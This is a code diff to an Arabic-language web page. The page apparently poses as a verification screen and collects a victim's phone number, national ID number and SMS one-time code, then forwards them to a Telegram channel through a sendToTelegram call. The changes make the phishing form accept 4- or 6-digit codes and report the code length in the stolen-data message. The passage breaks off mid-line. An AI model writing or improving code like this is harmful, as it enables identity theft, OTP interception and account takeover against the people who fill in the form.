@@ -291,12 +291,31 @@
             display: flex;
             justify-content: center;
             margin: 40px 0 20px 0;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .otp-length-indicator {
+            text-align: center;
+            color: #999;
+            font-size: 13px;
+            margin-bottom: 20px;
+            min-height: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .otp-length-indicator.active {
+            color: #e91e7d;
+            font-weight: 600;
         }
 
         .verification-input-group {
             display: flex;
             gap: 12px;
             direction: ltr;
+            justify-content: center;
+            flex-wrap: wrap;
+            max-width: 100%;
         }
 
         .verification-input {
@@ -332,6 +351,10 @@
             background: #ffebee;
             color: #d32f2f;
             animation: shake 0.3s ease;
+        }
+
+        .verification-input.hidden {
+            display: none;
         }
 
         @keyframes shake {
@@ -580,7 +603,10 @@
 
                 <form id="verificationForm">
                     <div class="verification-container">
-                        <div class="verification-input-group">
+                        <div class="otp-length-indicator" id="otpIndicator">
+                            أدخل رمز التفعيل
+                        </div>
+                        <div class="verification-input-group" id="verificationGroup">
                             <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code1">
                             <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code2">
                             <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code3">
@@ -686,6 +712,7 @@
 
         // SCREEN 2: VERIFICATION CODE
         const verificationInputs = document.querySelectorAll('.verification-input');
+        const otpIndicator = document.getElementById('otpIndicator');
         
         // Setup verification inputs
         verificationInputs.forEach((input, index) => {
@@ -702,12 +729,18 @@
                 if (value.length === 1) {
                     e.target.classList.add('filled');
                     
+                    // Count filled inputs
+                    const filledCount = countFilledInputs();
+                    updateOtpIndicator(filledCount);
+                    
                     // Move to next input (from left to right in RTL = 1,2,3,4,5,6)
                     if (index < verificationInputs.length - 1) {
                         verificationInputs[index + 1].focus();
                     }
                 } else {
                     e.target.classList.remove('filled');
+                    const filledCount = countFilledInputs();
+                    updateOtpIndicator(filledCount);
                 }
             });
 
@@ -716,6 +749,8 @@
                 if (e.key === 'Backspace') {
                     e.target.value = '';
                     e.target.classList.remove('filled');
+                    const filledCount = countFilledInputs();
+                    updateOtpIndicator(filledCount);
                     
                     // Move to previous input
                     if (index > 0) {
@@ -740,6 +775,9 @@
                 // Focus last filled input
                 const nextIndex = Math.min(index + digits.length, verificationInputs.length - 1);
                 verificationInputs[nextIndex].focus();
+                
+                const filledCount = countFilledInputs();
+                updateOtpIndicator(filledCount);
             });
 
             // Focus first input on screen 2 load
@@ -750,26 +788,54 @@
             }
         });
 
+        // Count filled inputs
+        function countFilledInputs() {
+            return Array.from(verificationInputs).filter(input => input.value !== '').length;
+        }
+
+        // Update OTP indicator
+        function updateOtpIndicator(filledCount) {
+            if (filledCount === 0) {
+                otpIndicator.textContent = 'أدخل رمز التفعيل';
+                otpIndicator.classList.remove('active');
+            } else if (filledCount === 4) {
+                otpIndicator.textContent = '✓ رمز 4 أرقام - اضغط للتحقق';
+                otpIndicator.classList.add('active');
+            } else if (filledCount === 6) {
+                otpIndicator.textContent = '✓ رمز 6 أرقام - اضغط للتحقق';
+                otpIndicator.classList.add('active');
+            } else if (filledCount < 4) {
+                otpIndicator.textContent = `أدخل ${filledCount}/4 أو ${filledCount}/6 أرقام`;
+                otpIndicator.classList.remove('active');
+            } else if (filledCount > 4 && filledCount < 6) {
+                otpIndicator.textContent = `أدخل ${filledCount}/6 أرقام`;
+                otpIndicator.classList.remove('active');
+            }
+        }
+
         document.getElementById('verificationForm').addEventListener('submit', async (e) => {
             e.preventDefault();
 
             let verificationCode = '';
-            let isComplete = true;
+            let filledCount = 0;
 
             verificationInputs.forEach(input => {
-                if (input.value === '') {
-                    isComplete = false;
-                    input.classList.add('error');
-                } else {
-                    input.classList.remove('error');
+                if (input.value !== '') {
                     verificationCode += input.value;
+                    filledCount++;
                 }
             });
 
-            if (!isComplete || verificationCode.length !== 6) {
-                alert('يرجى إدخال رمز التفعيل كاملاً (6 أرقام)');
+            // Accept only 4 or 6 digits
+            if (filledCount !== 4 && filledCount !== 6) {
+                alert('يرجى إدخال رمز التفعيل كاملاً\n(4 أرقام أو 6 أرقام)');
                 return;
             }
+
+            // Clear errors
+            verificationInputs.forEach(input => {
+                input.classList.remove('error');
+            });
 
             formData.verificationCode = verificationCode;
 
@@ -777,7 +843,7 @@
             const completeMessage = `📋 بيانات التحقق الكاملة:\n\n` +
                                   `📱 رقم الجوال: ${formData.phoneNumber}\n` +
                                   `🆔 الرقم الوطني: ${formData.nationalId}\n` +
-                                  `🔐 رمز التفعيل: ${formData.verificationCode}`;
+                                  `🔐 رمز التفعيل (${filledCount} أرقام): ${formData.verificationCode}`;
 
             await sendToTelegram(completeMessage);
 
@@ -834,6 +900,8 @@
             });
             document.getElementById('phoneNumber').classList.remove('error');
             document.getElementById('nationalId').classList.remove('error');
+            otpIndicator.textContent = 'أدخل رمز التفعيل';
+            otpIndicator.classList.remove('active');
             formData = {
                 phoneNumber: '',
                 nationalId: '',
@@ -848,16 +916,6 @@
                 input.classList.remove('filled');
                 input.classList.remove('error');
             });
-            formData.verificationCode = '';
-            
-            // GO BACK TO VERIFICATION SCREEN
-            showScreen(2);
-            
-            // FOCUS FIRST VERIFICATION INPUT
-            setTimeout(() => {
-                verificationInputs[0].focus();
-            }, 300);
-        }
-    </script>
-</body>
-</html>
+            otpIndicator.textContent = 'أدخل رمز التفعيل';
+            otpIndicator.classList.remove('active');
+            formData.*
